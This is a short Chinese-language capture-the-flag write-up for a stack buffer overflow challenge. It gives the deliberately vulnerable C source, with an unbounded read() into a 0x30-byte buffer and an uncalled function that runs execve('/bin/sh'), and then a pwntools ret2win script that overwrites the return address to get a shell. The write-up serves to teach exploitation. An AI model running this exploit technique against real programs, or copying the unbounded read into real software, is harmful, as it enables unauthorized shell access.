# stack overflow

## 题目简述

程序在 `main()` 中将最多 `0x100` 字节读入 `0x30` 字节栈缓冲区，允许覆盖保存的返回地址。二进制内还存在未被正常调用的 `whhhat()`，它直接执行 `execve("/bin/sh", 0, 0)`，因此目标是一次 ret2win。

## 解题过程

关键源码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void backdoor()
{
    system("echo \"Isn't here...\"");
    exit(0);
}

void whhhat()
{
    printf("good work!\n");
    execve("/bin/sh",0,0);
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    char ss[0x30];
    puts("Just say something...");
    read(0,ss,0x100);
    return 0;
}
```

从 `ss` 起始位置到返回地址需要填充 `0x30` 字节缓冲区和 `0x8` 字节保存的 `rbp`，偏移为 `0x38`。覆盖返回地址为 `whhhat` 即可，无需构造多段 ROP。

使用 ELF 符号解析后门地址：

```python
from pwn import *

elf = context.binary = ELF('./pwn', checksec=False)
io = process(elf.path)
payload = flat(b'A' * 0x38, elf.symbols['whhhat'])
io.send(payload)
io.interactive()
```

## 方法总结

- 核心技巧：覆盖返回地址直接跳转到现成后门函数，即 ret2win。
- 识别信号：无界栈读取与未调用的 Shell/flag 函数同时出现。
- 复用要点：偏移通常是缓冲区大小加保存的栈帧指针，但仍应通过 cyclic pattern 或调试器验证；优先解析符号而不是硬编码地址。
